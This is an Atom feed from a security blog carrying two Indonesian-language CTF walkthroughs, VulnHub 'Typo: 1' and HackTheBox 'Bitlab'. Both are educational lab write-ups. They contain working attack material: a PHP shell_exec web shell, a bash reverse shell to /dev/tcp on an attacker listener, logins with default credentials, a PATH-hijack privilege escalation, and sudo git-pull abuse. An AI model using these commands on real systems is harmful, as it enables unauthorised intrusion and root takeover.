<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://bl33dz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://bl33dz.github.io/" rel="alternate" type="text/html" /><updated>2020-05-20T16:04:36+07:00</updated><id>http://bl33dz.github.io/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; ordinary people&lt;br&gt; interested in linux and programming
</subtitle><author><name>bl33dz</name></author><entry><title type="html">[VULNHUB] Typo: 1</title><link href="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html" rel="alternate" type="text/html" title="[VULNHUB] Typo: 1" /><published>2020-05-20T00:00:00+07:00</published><updated>2020-05-20T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/20/vulnhub-typo1</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/20/vulnhub-typo1.html">&lt;p&gt;Ketemu lagi di artikel baru saya, artikel ini ditulis karena kebetulan saya sedang tidak ada kerjaan lain dan sedang dibuat pusing oleh machine &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/252&quot;&gt;Travel&lt;/a&gt; pada HackTheBox. Maka dari itu saya iseng iseng liat machine di vulnhub dan menemukan machine &lt;a href=&quot;https://www.vulnhub.com/entry/typo-1,472/&quot;&gt;Typo: 1&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Machine ini sendiri menggunakan operasi sistem Linux dan tugas saya menemukan cara mendapatkan root flag pada machine ini. Setelah saya download file .ova machine ini, saya langsung deploy pada VirtualBox dan saya run machine tersebut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo1.png&quot; alt=&quot;typo1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Terlihat IP Machine ini adalah &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.56.109&lt;/code&gt; (tergantung virtualbox) maka saya menambahkan IP tersebut ke &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; dengan domain &lt;code class=&quot;highlighter-rouge&quot;&gt;typo.local&lt;/code&gt; seperti yang diperintahkan pada deskripsi machine. Setelah itu saya melakukan scanning dengan nmap dan mendapatkan output seperti berikut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# nmap -sV -sC -oN typo.nmap typo.local
[REDACTED]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)
|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)
|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: TYPO3 CMS
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: Armour: Infosec
|_Requested resource was http://typo.local/en/
8000/tcp open  http    Apache httpd 2.4.38
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://typo.local
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
[REDACTED]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Kita bisa melihat beberapa port yang terbuka, namun saya tertarik dengan port 80. Ketika saya buka &lt;a href=&quot;http://typo.local/&quot;&gt;http://typo.local/&lt;/a&gt; akan ter-redirect ke &lt;a href=&quot;http://typo.local/en/&quot;&gt;http://typo.local/en/&lt;/a&gt; dan hanya menampilkan &lt;code class=&quot;highlighter-rouge&quot;&gt;HELLO user&lt;/code&gt;. Karena web ini menggunakan &lt;a href=&quot;https://typo3.org/&quot;&gt;Typo3&lt;/a&gt; saya mencoba melihat path &lt;code class=&quot;highlighter-rouge&quot;&gt;/typo3&lt;/code&gt; dan menampilkan tampilan seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo2.png&quot; alt=&quot;typo2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Saya mencoba mencari mencari berbagai exploit namun ternyata tidak ada yang cocok, akhirnya saya coba melakukan bruteforce directory dan hanya menemukan &lt;code class=&quot;highlighter-rouge&quot;&gt;/fileadmin&lt;/code&gt; dan itu adalah directory milik typo3. Maka saya mencoba melakukan bruteforce pada port lain.&lt;/p&gt;

&lt;p&gt;Port 8080:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8080/FUZZ
[REDACTED]
index.html              [Status: 200, Size: 0, Words: 1, Lines: 1]
phpinfo.php             [Status: 200, Size: 95848, Words: 4749, Lines: 1179]
[REDACTED]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Port 8081:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://typo.local:8081/FUZZ
[REDACTED]
index.html              [Status: 200, Size: 6, Words: 1, Lines: 2]
phpmyadmin              [Status: 301, Size: 320, Words: 20, Lines: 10]
[REDACTED]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Untuk port 8000 sendiri tidak saya lakukan bruteforce karena semua request akan diarahkan ke port 80. Dari result diatas saya tetap tidak menemukan sesuatu menarik kecuali &lt;code class=&quot;highlighter-rouge&quot;&gt;phpmyadmin&lt;/code&gt;. Awalnya saya stuck cukup lama dan akhirnya saya coba coba login di phpmyadmin dengan user “root” dan password “” namun ternyata tidak diperbolehkan login tanpa password. Kemudian saya mencoba lagi dengan &lt;del&gt;ilmu dukun&lt;/del&gt; user “root” dan password “root” ternyata dapat login pada phpmyadmin tersebut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo3.png&quot; alt=&quot;typo3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Saya langsung inisiatif melihat tabel user dan mencoba merubah password admin, namun ternyata saya tidak tahu jenis hash yang digunakan. Setelah mencari cari ternyata web tersebut menggunakan hash &lt;code class=&quot;highlighter-rouge&quot;&gt;argon2id&lt;/code&gt;. Saya pun mencoba melakukan generate pada web &lt;a href=&quot;https://argon2.online/&quot;&gt;https://argon2.online/&lt;/a&gt; menggunakan option seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo4.png&quot; alt=&quot;typo4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Setelah mendapatkan hasil hash dari password &lt;code class=&quot;highlighter-rouge&quot;&gt;bleedz123&lt;/code&gt; maka saya melakukan update pada tabel &lt;code class=&quot;highlighter-rouge&quot;&gt;be_users&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo5.png&quot; alt=&quot;typo5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Saya mencoba login pada CMS Typo3 di port 80 dengan menggunakan user &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; dan password &lt;code class=&quot;highlighter-rouge&quot;&gt;bleedz123&lt;/code&gt;. Ternyata saya dapat login dan diarahkan ke dashboard admin. Disini saya langsung mencoba melakukan upload file namun gagal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo6.png&quot; alt=&quot;typo6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Setelah membaca baca dokumentasi ternyata ada cara untuk menghapus filter extension pada Typo3 dengan mengosongkan fileDenyPattern pada Global Typo3 Options. (&lt;a href=&quot;https://docs.typo3.org/m/typo3/guide-security/8.7/en-us/GuidelinesIntegrators/GlobalTypo3Options/Index.html&quot;&gt;Reference&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo7.png&quot; alt=&quot;typo7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Maka saya tinggal melakukan upload dengan langkah sebelumnya dan file saya akan ter-upload pada &lt;code class=&quot;highlighter-rouge&quot;&gt;http://typo.local/fileadmin/bejak.php&lt;/code&gt;. Saya langsung mencoba lakukan backconnect dengan fitur yang sudah tersedia pada webshell b374k.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo8.png&quot; alt=&quot;typo8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tentunya sebelum saya backconnect saya sudah menyiapkan listener dengan command seperti berikut.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/typo9.png&quot; alt=&quot;typo9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lalu setelah akhirnya mendapatkan interactive shell dan melakukan magic netcat agar lebih stabil saya mencoba melakukan enumerasi menggunakan &lt;a href=&quot;https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;. Dan saya mencurigai 2 file suid yang terdapat pada server tersebut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-] SUID files:
[REDACTED]
-rwsr-sr-x 1 root root 6883 Mar 30 17:13 /usr/local/bin/apache2-restart
-rwsr-sr-x 1 root root 2963219 Feb 13 13:00 /usr/local/bin/phpunit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awalnya saya mencoba phpunit dengan membuat file &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/evil/revTest.php&lt;/code&gt; dan mencoba run &lt;code class=&quot;highlighter-rouge&quot;&gt;phpunit evil&lt;/code&gt; namun ternyata saya hanya mendapatkan user www-data bukan root.&lt;/p&gt;

&lt;p&gt;Akhirnya saya mencoba mengidentifikasi file &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/bin/apache2-restart&lt;/code&gt; karena secara default file tersebut tidaklah ada.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@typo:/tmp$ file /usr/local/bin/apache2-restart 
/usr/local/bin/apache2-restart: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=7f141086cfbe35713b5871941d2fdb74795d89ab, not stripped

www-data@typo:/tmp$ strings /usr/local/bin/apache2-restart 
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
[REDACTED]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ternyata binary tersebut hanya menjalankan command &lt;code class=&quot;highlighter-rouge&quot;&gt;service apache2 start&lt;/code&gt; dimana pada kasus seperti ini kita dapat melakukan privilege escalation dengan mengubah variable PATH. Pertama siapkan listener dan jalankan command seperti berikut ini.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@typo:/tmp$ vim service
www-data@typo:/tmp$ chmod +x service 
www-data@typo:/tmp$ cat service 
#!/bin/bash
/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/4444 0&amp;gt;&amp;amp;1
www-data@typo:/tmp$ export PATH=/tmp
www-data@typo:/tmp$ /usr/local/bin/apache2-restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setelah itu listener kita akan mendapat interactive shell dan kita dapat melihat flag root.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/typo# nc -vlp 4444
listening on [any] 4444 ...
connect to [192.168.56.1] from typo.local [192.168.56.109] 52994
root@typo:/tmp# export PATH=/bin:/usr/bin:/usr/local/bin 
export PATH=/bin:/usr/bin:/usr/local/bin
root@typo:/tmp# cd /root
cd /root
root@typo:/root# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@typo:/root# ls
ls
proof.txt
root@typo:/root# cat proof.txt
cat proof.txt
Best of Luck
$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3aap2ff0LbLYZrF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Menurut pendapat saya machine ini sendiri memerlukan banyak enumerating terutama pada tiap port dan kita perlu memiliki sedikit &lt;del&gt;ilmu dukun&lt;/del&gt; insting untuk menebak password PHPMyAdmin.&lt;/p&gt;

&lt;p&gt;Sekian walkthrough yang bisa saya buat, jika ada yang kurang jelas bisa ditanyakan melalui telegram atau facebook saya and see you next article.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="vulnhub" /><category term="linux" /><category term="medium" /><summary type="html">Ketemu lagi di artikel baru saya, artikel ini ditulis karena kebetulan saya sedang tidak ada kerjaan lain dan sedang dibuat pusing oleh machine Travel pada HackTheBox. Maka dari itu saya iseng iseng liat machine di vulnhub dan menemukan machine Typo: 1.</summary></entry><entry><title type="html">[HTB] Bitlab</title><link href="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html" rel="alternate" type="text/html" title="[HTB] Bitlab" /><published>2020-05-05T00:00:00+07:00</published><updated>2020-05-05T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/05/hackthebox-bitlab</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/05/hackthebox-bitlab.html">&lt;p&gt;Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.&lt;/p&gt;

&lt;p&gt;Oke, machine ini menggunakan os linux dan ip addressnya adalah 10.10.10.114 dan hal yang pertama kita lakukan adalah ritual scanning dengan nmap untuk ngintip port port yang kebuka&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nmap -sV 10.10.10.114
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 10:57 WIB
Nmap scan report for 10.10.10.114
Host is up (0.41s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Result diatas menunjukkan bahwa machine ini memiliki 2 buah port yang terbuka yaitu port 80(http) dan 22(ssh). Yaudah karena dapatnya cuma itu pertama saya lihat lihat port 80nya dulu.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-1.png&quot; alt=&quot;bitlab-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bisa dilihat bahwa di port tersebut terdapat webapp gitlab. Nah setelah mencoba menelusuri web tersebut terdapat sebuah page agak mencurigakan &lt;a href=&quot;http://10.10.10.114/help/bookmarks.html&quot;&gt;http://10.10.10.114/help/bookmarks.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-2.png&quot; alt=&quot;bitlab-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nah ketika mencoba mengklik &lt;code class=&quot;highlighter-rouge&quot;&gt;Gitlab Login&lt;/code&gt; tidak ter-redirect kemanapun dan kalau sudah begini view-source lah kuncinya&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;A HREF=&quot;javascript:(function(){ var _0x4b18=[&amp;amp;quot;\x76\x61\x6C\x75\x65&amp;amp;quot;,&amp;amp;quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;amp;quot;,&amp;amp;quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;amp;quot;,&amp;amp;quot;\x63\x6C\x61\x76\x65&amp;amp;quot;,&amp;amp;quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;amp;quot;,&amp;amp;quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;amp;quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()&quot; ADD_DATE=&quot;1554932142&quot;&amp;gt;Gitlab Login&amp;lt;/A&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Disana terdapat javascript function yang digunakan untuk mengubah suatu value tag html. &lt;em&gt;Kok bisa tau?&lt;/em&gt; tau aja sih soalnya punya ilmu dukun. Kebetulan karena namanya &lt;code class=&quot;highlighter-rouge&quot;&gt;Gitlab Login&lt;/code&gt; maka saya akan mengeksekusi javascript tersebut pada form login menggunakan console. (btw decode dulu html_entity-nya)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-3.png&quot; alt=&quot;bitlab-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nah kan keisi sendiri username sama passwordnya, kalau mau lihat passwordnya bisa inspect element webnya dan ubah type password ke text. Username: &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt; dan Password: &lt;code class=&quot;highlighter-rouge&quot;&gt;11des0081x&lt;/code&gt;. Oke langsung saja login dan seperti biasa enumerate webnya. Saya menemukan 2 repository &lt;a href=&quot;http://10.10.10.114/root/profile/&quot;&gt;Profile&lt;/a&gt; dan &lt;a href=&quot;http://10.10.10.114/root/deployer/&quot;&gt;Deployer&lt;/a&gt;. Ketika saya mau mencoba membuka Settings terbuka &lt;a href=&quot;http://10.10.10.114/profile/&quot;&gt;http://10.10.10.114/profile/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Setelah mendapat beberapa hal hal berguna saya menyimpulkan bahwa &lt;a href=&quot;http://10.10.10.114/profile/&quot;&gt;http://10.10.10.114/profile/&lt;/a&gt; isinya sama persis dengan repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt; dan pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;deployer&lt;/code&gt; terdapat script php untuk melakukan git pull pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Disini saya langsung mencoba membuat sebuah file di repository file dengan extensi php dan melakukan merge request&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-4.png&quot; alt=&quot;bitlab-4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dan ketika saya coba check ternyata file tersebut berhasil ditambahkan dan singkat cerita akhirnya saya mendapat reverse shell 
(referensi: &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nc -vlp 1337
listening on [any] 1337 ...
10.10.10.114: inverse host lookup failed: Unknown host
connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 48218
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setelah mendapat reverse shell saya teringat sebuah script pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;deployer&lt;/code&gt; tadi&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php://input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;json_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$repo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;project&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;event_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;object_attributes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$branch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;object_attributes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;target_branch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$repo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$branch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'master'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$event&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'merge_request'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'merged'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cd ../profile/; sudo git pull'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nah dari script tersebut terlihat bahwa &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; dapat menjalankan command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo git pull&lt;/code&gt; dan saya mencoba memastikan dengan command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Setelah baca sana sini saya akan &lt;del&gt;tidur&lt;/del&gt; langsung melakukan privilege escalation dengan git hook &lt;code class=&quot;highlighter-rouge&quot;&gt;post-merge&lt;/code&gt; 
(referensi: &lt;a href=&quot;https://stackoverflow.com/a/21338177&quot;&gt;https://stackoverflow.com/a/21338177&lt;/a&gt;)&lt;/p&gt;

